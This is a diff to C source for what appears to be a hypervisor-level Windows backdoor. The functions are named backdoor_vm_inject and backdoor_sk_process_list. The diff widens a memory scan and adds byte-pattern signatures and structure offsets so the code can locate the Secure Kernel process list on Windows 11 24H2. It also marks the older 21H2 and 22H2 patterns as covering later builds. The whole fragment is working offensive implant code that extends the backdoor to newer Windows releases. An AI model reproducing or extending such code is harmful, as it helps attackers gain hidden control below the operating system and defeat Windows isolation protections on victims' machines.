@@ -360,7 +360,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
     uint32_t hal_idata_size = 0;
 
     // scan for the beginning of the image
-    while (hal_lm_stub - hal_addr_virt < PAGE_SIZE * 0x500)
+    while (hal_lm_stub - hal_addr_virt < PAGE_SIZE * 0x800)
     {
         m_quiet = true;
 
@@ -1852,7 +1852,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                     matched = true;
                 }
                 /*
-                    Windows 11 21H2 variation:
+                    Windows 11 21H2 and later variation:
 
                         .text:000000014002C39E      lea     r8, SkpsProcessList
                         .text:000000014002C3A5      lea     rcx, [rdi+0D0h]
@@ -1873,7 +1873,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                     matched = true;
                 }
                 /*
-                    Windows 11 22H2 variation:
+                    Windows 11 22H2 and later variation:
 
                         .text:000000014002C39E      lea     r8, SkpsProcessList
                         .text:000000014002C3A5      lea     rcx, [rdi+0E0h]
@@ -1890,6 +1890,27 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                     sk_process_cr3      = 0x0040;
                     sk_process_list     = 0x00e0;
                     sk_process_policy   = 0x01b8;
+
+                    matched = true;
+                }
+                /*
+                    Windows 11 24H2 variation:
+
+                        .text:00000001400A3496      lea     r8, SkpsProcessList
+                        .text:00000001400A349D      lea     rcx, [rdi+0E8h]
+                        .text:00000001400A34A4      cmp     [rdx], r8
+                        .text:00000001400A34A7      jz      short loc_1400A34B0
+                */
+                else if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
+                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f && *(p + 0x0a) == 0xe8 &&
+                         *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
+                         *(p + 0x11) == 0x74 && *(p + 0x12) == 0x07)
+                {
+                    sk_process_flags    = 0x0000;
+                    sk_process_pid      = 0x0038;
+                    sk_process_cr3      = 0x0040;
+                    sk_process_list     = 0x00e8;
+                    sk_process_policy   = 0x01c8;
 
                     matched = true;
                 }
